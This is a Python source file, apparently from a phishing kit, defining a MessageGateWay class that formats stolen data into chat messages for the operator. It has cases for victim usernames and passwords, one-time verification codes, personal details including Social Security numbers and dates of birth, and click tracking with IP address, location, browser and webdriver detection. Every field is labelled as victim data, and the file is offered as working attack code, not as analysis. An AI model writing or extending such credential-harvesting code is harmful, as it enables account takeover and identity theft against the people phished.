
class MessageGateWay:

    def __init__(self, data):
        self.data = data

    def dispatch_message(self):

        match self.data.get("type"):
            case "credentials":
                return (
                    f"👤 *USERNAME:* `{self.data.get('username')}`\n\n"
                    f"🔑 *VICTIM PASSWORD:* `{self.data.get('password')}`"
                )
            case "code":
                return (
                    f"🔢 *VICTIM CODE:* `{self.data.get('code')}`"
                )
            case 'bio-data':
                return (
                    f'👤 *VICTIM INFORMATION*\n\n'
                    f"👤 *FIRST_NAME:* `{self.data.get('firstName')}`\n\n"
                    f"👤 *LAST_NAME:* `{self.data.get('lastName')}`\n\n"
                    f"📞 *PHONE NUMBER:* `{self.data.get('phoneNumber')}`\n\n"
                    f"📧 *ZIP CODE:* `{self.data.get('zipCode')}`\n\n"
                    f"📍 *CITY:* `{self.data.get('city')}`\n\n"
                    f"📍 *ADDRESS:* `{self.data.get('address')}`\n\n"
                    f"📅 *DATE OF BIRTH:* `{self.data.get('dateOfBirth')}`\n\n"
                    f"👤 *SSN:* `{self.data.get('ssn')}`"
                )
            case 'selected-verification-method':
                return (
                    f"📱 *SELECTED VERIFICATION METHOD:* \n\n`{self.data.get('selected_number')}`"
                )
            case 'click':
                return (
                    f"📱 *VICTIM IN [CLICKED]:* \n\n"
                    f"🌐 *VICTIM CLICK:* `{self.data.get('click')['VICTIM_ID']}`\n\n"
                    f"👤 *BROWSER:* `{self.data.get('click')['USER_AGENT']}`\n\n"
                    f"📍 *CITY:* `{self.data.get('click')['CITY']}`\n\n"
                    f"📍 *COUNTRY:* `{self.data.get('click')['COUNTRY']}`\n\n"
                    f"📍 *REGION:* `{self.data.get('click')['REGION']}`\n\n"
                    f"📡 *IP ADDRESS:* `{self.data.get('click')['IP']}`\n\n"
                    f"🤖 *WEB DRIVER:* `{self.data.get('click')['WEB_DRIVER']}`"
                )
            case _:
                return "Unknown message type"
